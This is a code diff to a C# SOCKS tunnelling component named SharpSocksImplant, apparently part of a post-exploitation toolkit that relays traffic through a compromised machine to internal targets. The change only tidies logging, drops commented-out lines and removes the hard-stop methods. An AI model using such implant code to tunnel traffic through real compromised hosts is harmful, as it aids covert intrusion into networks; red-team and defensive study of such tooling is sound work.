@@ -132,14 +132,10 @@ namespace SharpSocksImplant.Socks
                         return;
                     }
 
-                    //if (fromSocksServer.Any())
-                    //{
                     targetStream.Write(fromSocksServer.ToArray(), 0, fromSocksServer.Count);
                     targetStream.Flush();
                     ImplantComms.LogMessage(
                         $"[{targetId}][Implant -> Target] Written {fromSocksServer.Count} bytes to target: {targetInfo.TargetHost}:{targetInfo.TargetPort}");
-                    //fromSocksServer = new List<byte>();
-                    //}
 
                     var targetResponseBytes = new List<byte>();
                     while (!targetInfo.Exit && targetInfo.TargetTcpClient.Connected && TcpUtils.CheckTcpConnectionState(targetInfo.TargetTcpClient) && targetStream.DataAvailable &&
@@ -153,15 +149,10 @@ namespace SharpSocksImplant.Socks
                             targetResponseBytes.AddRange(temp.ToList().Take(countAvailableBytes));
                         }
 
-                        if (countAvailableBytes > 0)
-                        {
-                            ImplantComms.LogMessage(
-                                $"[{targetId}][Target -> Implant] Read {countAvailableBytes} bytes from {targetInfo.TargetTcpClient.Client.RemoteEndPoint}");
-                        }
-                        else
-                        {
-                            ImplantComms.LogMessage($"[{targetId}][Target -> Implant] Read 0 bytes from {targetInfo.TargetTcpClient.Client.RemoteEndPoint}");
-                        }
+                        ImplantComms.LogMessage(
+                            countAvailableBytes > 0
+                                ? $"[{targetId}][Target -> Implant] Read {countAvailableBytes} bytes from {targetInfo.TargetTcpClient.Client.RemoteEndPoint}"
+                                : $"[{targetId}][Target -> Implant] Read 0 bytes from {targetInfo.TargetTcpClient.Client.RemoteEndPoint}");
 
                         if (targetInfo.Exit)
                         {
@@ -212,20 +203,6 @@ namespace SharpSocksImplant.Socks
             var target = _targets[targetId];
             ImplantComms.LogMessage($"[{targetId}] Closing connection to {target.TargetHost}:{target.TargetPort}");
             target.Exit = true;
-        }
-
-        public void HardStopAll()
-        {
-            ImplantComms.LogMessage("HARD STOP ALL TRIGGERED");
-            _targets.Keys.ToList().ForEach(HardStop);
-        }
-
-        public void HardStop(string targetId)
-        {
-            var target = _targets[targetId];
-            ImplantComms.LogMessage($"HARD STOP ALL ON CONNECTION TO {target.TargetHost}:{target.TargetPort}");
-            target.Exit = true;
-            target.TargetTcpClient.Close();
         }
     }
 }
